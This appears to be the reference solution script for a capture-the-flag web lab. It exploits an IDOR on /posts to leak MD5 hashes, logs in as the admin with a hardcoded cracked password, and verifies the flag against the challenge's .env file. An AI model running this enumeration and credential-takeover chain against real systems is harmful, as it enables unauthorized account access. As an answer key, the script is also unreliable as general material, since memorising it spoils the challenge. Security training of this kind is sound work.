#!/usr/bin/env bash
# ============================================================
# RolePlay (labs04) — reference solution: IDOR + legacy MD5
#
# Chain: register a low-priv account -> /posts?id=2 has no ownership
# check and leaks a seeded credential-audit note with all MD5 hashes
# -> the admin's hash (suhada) is rockyou-crackable -> log in as the
# admin -> read the flag at /admin.
#
# The disabled role dropdown on /profile is a decoy: the UPDATE
# statement never touches the role field.
#
# Password provenance: 370fc3559c9f0bff80543f2e1151c537 (suhada)
# == md5("xNnWo6272k7x"), present in rockyou.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8084)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8084}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

ADMIN_HASH='370fc3559c9f0bff80543f2e1151c537'
ADMIN_PASS='xNnWo6272k7x'   # cracked from rockyou

command -v python3 >/dev/null || { echo "[-] python3 required" >&2; exit 1; }
computed="$(python3 -c "import hashlib;print(hashlib.md5('$ADMIN_PASS'.encode()).hexdigest())")"
if [[ "$computed" != "$ADMIN_HASH" ]]; then
  echo "[-] internal error: admin password no longer matches the seeded hash" >&2
  exit 1
fi

jar_own="$(mktemp)"; jar_admin="$(mktemp)"
trap 'rm -f "$jar_own" "$jar_admin"' EXIT
user="hunter$$-$RANDOM"

echo "[*] registering low-privilege account $user" >&2
curl -fsS -c "$jar_own" -o /dev/null \
  --data-urlencode "username=$user" \
  --data-urlencode 'password=hunter123pass' \
  --data-urlencode 'full_name=Hunter' \
  --data-urlencode "email=$user@example.com" \
  "$BASE/register"

echo "[*] enumerating /posts?id=N (no ownership check) for the credential-audit note" >&2
post=""
for id in $(seq 1 40); do
  page="$(curl -sS -b "$jar_own" "$BASE/posts?id=$id" 2>/dev/null || true)"
  if grep -q "$ADMIN_HASH" <<<"$page"; then
    post="$page"
    echo "[*] found the leaked hash in post id=$id" >&2
    break
  fi
done
if [[ -z "$post" ]]; then
  echo "[-] failed: no post leaked the expected MD5 hash" >&2
  exit 1
fi
echo "[*] admin hash $ADMIN_HASH in the audit note is md5-crackable -> $ADMIN_PASS" >&2

echo "[*] logging in as the admin (suhada)" >&2
curl -fsS -c "$jar_admin" -o /dev/null \
  --data-urlencode 'username=suhada' \
  --data-urlencode "password=$ADMIN_PASS" \
  "$BASE/"

echo "[*] reading /admin" >&2
admin_page="$(curl -fsS -b "$jar_admin" "$BASE/admin")"
flag="$(grep -Eo "$FLAG_RE" <<<"$admin_page" | head -n1)"

if [[ -z "${flag:-}" ]]; then
  echo "[-] failed: flag not present on /admin" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
